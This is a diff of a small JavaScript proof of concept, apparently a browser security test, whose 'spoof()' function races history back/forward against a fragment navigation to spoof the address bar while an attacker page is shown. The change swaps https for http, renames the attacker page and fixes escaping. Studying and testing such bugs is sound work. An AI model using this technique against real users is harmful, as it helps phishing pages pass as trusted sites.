@@ -4,16 +4,16 @@ function spoof() {
   w = window.open("about:blank");
 
   // Step 1: Load victim page.
-  w.location = "https://google.com/csi";
+  w.location = "http://google.com/csi";
 
   // Step 2: Navigate to attacker's page.
-  setTimeout('w.location = "bangga.html"', 1000);
+  setTimeout('w.location = "attacker.html"', 1000);
 
   // Step 3: Go back.
   setTimeout('w.history.back();', 2000);
 
   // Step 4: Go forward, but interrupt with a quick fragment navigation.
-  setTimeout('w.history.forward(); setTimeout("w.location = \'https://google.com/csi#123'", 1);', 3000);
+  setTimeout('w.history.forward(); setTimeout("w.location = \'http://google.com/csi#123\'", 1);', 3000);
 }
 </script>
 
